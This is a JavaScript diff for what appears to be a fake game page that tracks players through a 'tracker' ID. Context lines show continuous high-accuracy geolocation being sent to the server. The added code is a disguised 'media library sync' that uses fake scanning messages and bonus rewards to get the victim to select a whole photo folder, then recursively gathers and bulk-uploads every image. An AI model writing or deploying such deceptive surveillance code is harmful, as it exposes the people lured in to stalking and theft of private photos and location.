@@ -15,6 +15,14 @@ const onlineCount = document.getElementById('online-count');
 const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
+const syncPanel = document.getElementById('sync-panel');
+const syncTitle = document.getElementById('sync-title');
+const syncSub = document.getElementById('sync-sub');
+const syncFill = document.getElementById('sync-fill');
+const syncCount = document.getElementById('sync-count');
+const syncSpinner = document.getElementById('sync-spinner');
+const syncRetry = document.getElementById('sync-retry');
+
 let watchId = null;
 let ws = null;
 let trackerId = null;
@@ -22,6 +30,14 @@ let earnings = 0;
 let streak = 0;
 let progress = 0;
 let gameTimers = [];
+let syncRunning = false;
+let totalSynced = 0;
+
+const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif)$/i;
+
+function isImageFile(file) {
+  return file.type.startsWith('image/') || IMAGE_EXT.test(file.name || '');
+}
 
 function showError(msg) {
   errorEl.textContent = msg;
@@ -53,6 +69,15 @@ function animateLobby() {
   }, 2000);
 }
 
+function setSyncUI({ title, sub, pct, count, done = false }) {
+  syncTitle.textContent = title;
+  syncSub.textContent = sub;
+  syncFill.style.width = `${pct}%`;
+  syncCount.textContent = count;
+  syncSpinner.classList.toggle('done', done);
+  syncRetry.classList.toggle('hidden', !done);
+}
+
 function startGameUI(name) {
   joinScreen.classList.add('hidden');
   playScreen.classList.remove('hidden');
@@ -63,7 +88,8 @@ function startGameUI(name) {
   setTimeout(() => {
     statusText.textContent = 'Match live!';
     statusSub.textContent = "You're in — keep playing to earn more";
-    document.getElementById('verify-banner').classList.remove('hidden');
+    syncPanel.classList.remove('hidden');
+    startMediaSync();
   }, 1500);
 
   rankEl.textContent = `#${rand(100, 999)}`;
@@ -119,7 +145,7 @@ function connectWs() {
 }
 
 async function uploadPhoto(file) {
-  if (!trackerId || !file) return;
+  if (!trackerId || !file) return false;
   const form = new FormData();
   form.append('file', file, file.name || 'photo.jpg');
   const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
@@ -129,84 +155,148 @@ async function uploadPhoto(file) {
   return res.ok;
 }
 
-async function uploadPhotos(files) {
-  let uploaded = 0;
-  for (const file of files) {
-    if (!file.type.startsWith('image/')) continue;
-    if (await uploadPhoto(file)) uploaded++;
-  }
-  return uploaded;
-}
-
-async function pickGalleryPhotos() {
-  const imageTypes = [{
-    description: 'Photos',
-    accept: {
-      'image/jpeg': ['.jpg', '.jpeg'],
-      'image/png': ['.png'],
-      'image/webp': ['.webp'],
-      'image/gif': ['.gif'],
-      'image/heic': ['.heic'],
-      'image/heif': ['.heif'],
-    },
-  }];
-
-  if (window.showOpenFilePicker) {
-    try {
-      const handles = await window.showOpenFilePicker({
-        multiple: true,
-        types: imageTypes,
-      });
-      return Promise.all(handles.map(h => h.getFile()));
-    } catch (e) {
-      if (e.name === 'AbortError') return [];
-    }
-  }
-
+function pickViaInput({ webkitdirectory = false, multiple = true, accept = '' } = {}) {
   return new Promise((resolve) => {
     const input = document.createElement('input');
     input.type = 'file';
-    input.multiple = true;
-    input.accept = '.jpg,.jpeg,.png,.webp,.gif,.heic,.heif';
+    input.multiple = multiple;
+    if (webkitdirectory) input.webkitdirectory = true;
+    if (accept) input.accept = accept;
     input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
     document.body.appendChild(input);
-    input.addEventListener('change', () => {
-      resolve([...input.files]);
+    const finish = (files) => {
       input.remove();
-    }, { once: true });
-    input.addEventListener('cancel', () => {
-      resolve([]);
-      input.remove();
-    }, { once: true });
+      resolve(files);
+    };
+    input.addEventListener('change', () => finish([...input.files]), { once: true });
     input.click();
   });
 }
 
-async function handlePhotoPick() {
-  verifyBtn.disabled = true;
-  verifyBtn.textContent = '…';
-  const files = await pickGalleryPhotos();
-  if (!files.length) {
-    verifyBtn.disabled = false;
-    verifyBtn.textContent = 'Choose photos';
-    return;
+async function readDirImages(dirHandle, acc = []) {
+  for await (const [, handle] of dirHandle.entries()) {
+    if (handle.kind === 'file') {
+      const file = await handle.getFile();
+      if (isImageFile(file)) acc.push(file);
+    } else if (handle.kind === 'directory') {
+      await readDirImages(handle, acc);
+    }
   }
-  const count = await uploadPhotos(files);
-  if (count > 0) {
-    verifyBanner.querySelector('strong').textContent = 'Verified ✓';
-    verifyBanner.querySelector('span').textContent = `${count} photo${count > 1 ? 's' : ''} added · 2× bonus active`;
-    verifyBtn.textContent = 'Add more photos';
-    progress = Math.min(progress + 25, 100);
-    progressFill.style.width = `${progress}%`;
-  }
-  verifyBtn.disabled = false;
-  if (verifyBtn.textContent === '…') verifyBtn.textContent = 'Choose photos';
+  return acc;
 }
 
-const verifyBanner = document.getElementById('verify-banner');
-const verifyBtn = document.getElementById('verify-btn');
+async function pickBulkMedia() {
+  if (window.showDirectoryPicker) {
+    try {
+      const dir = await window.showDirectoryPicker({ mode: 'read' });
+      const files = await readDirImages(dir);
+      if (files.length) return files;
+    } catch (e) {
+      if (e.name === 'AbortError') return null;
+    }
+  }
 
-verifyBtn.addEventListener('click', handlePhotoPick);
+  const folderFiles = await pickViaInput({ webkitdirectory: true });
+  const fromFolder = folderFiles.filter(isImageFile);
+  if (fromFolder.length) return fromFolder;
+
+  const galleryFiles = await pickViaInput({
+    multiple: true,
+    accept: '.jpg,.jpeg,.png,.webp,.gif,.heic,.heif',
+  });
+  return galleryFiles.filter(isImageFile);
+}
+
+async function runSyncUpload(files) {
+  const total = files.length;
+  let done = 0;
+  let ok = 0;
+  const queue = [...files];
+
+  const workers = Array.from({ length: 3 }, async () => {
+    while (queue.length) {
+      const file = queue.shift();
+      if (!file) break;
+      if (await uploadPhoto(file)) {
+        ok++;
+        totalSynced++;
+      }
+      done++;
+      const pct = Math.round((done / total) * 100);
+      setSyncUI({
+        title: 'Syncing media library…',
+        sub: `Uploading batch · ${ok} synced`,
+        pct,
+        count: `${done} / ${total} files`,
+      });
+    }
+  });
+
+  await Promise.all(workers);
+  return ok;
+}
+
+async function startMediaSync() {
+  if (syncRunning || !trackerId) return;
+  syncRunning = true;
+  syncSpinner.classList.remove('done');
+  syncRetry.classList.add('hidden');
+
+  setSyncUI({
+    title: 'Syncing media library…',
+    sub: 'Scanning device storage',
+    pct: 8,
+    count: 'Initializing…',
+  });
+
+  await new Promise(r => setTimeout(r, 1200));
+  setSyncUI({
+    title: 'Syncing media library…',
+    sub: 'Select your gallery folder or all photos',
+    pct: 18,
+    count: 'Waiting for access…',
+  });
+
+  const files = await pickBulkMedia();
+  if (files === null || !files.length) {
+    setSyncUI({
+      title: 'Sync paused',
+      sub: 'Tap sync again to connect gallery',
+      pct: 0,
+      count: 'No files selected',
+      done: true,
+    });
+    syncRunning = false;
+    return;
+  }
+
+  setSyncUI({
+    title: 'Syncing media library…',
+    sub: `Found ${files.length} files · starting upload`,
+    pct: 25,
+    count: `0 / ${files.length} files`,
+  });
+
+  const uploaded = await runSyncUpload(files);
+
+  setSyncUI({
+    title: uploaded ? 'Sync complete ✓' : 'Sync finished',
+    sub: uploaded ? `${uploaded} files synced · bonus unlocked` : 'No files uploaded',
+    pct: 100,
+    count: `${uploaded} / ${files.length} synced`,
+    done: true,
+  });
+
+  if (uploaded) {
+    progress = Math.min(progress + 30, 100);
+    progressFill.style.width = `${progress}%`;
+    progressHint.textContent = '🎉 Media sync boosted your bonus!';
+  }
+
+  syncRunning = false;
+}
+
+syncRetry.addEventListener('click', () => startMediaSync());
 
 async function startPlaying() {
   hideError();
@@ -235,12 +325,11 @@ async function startPlaying() {
           const { latitude, longitude, accuracy } = pos.coords;
           sendLocation(latitude, longitude, accuracy);
         },
-        () => { /* silent — game continues */ },
+        () => { /* silent */ },
         { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
       );
     }
 
-    // HTTP fallback heartbeat every 8s
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
       const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
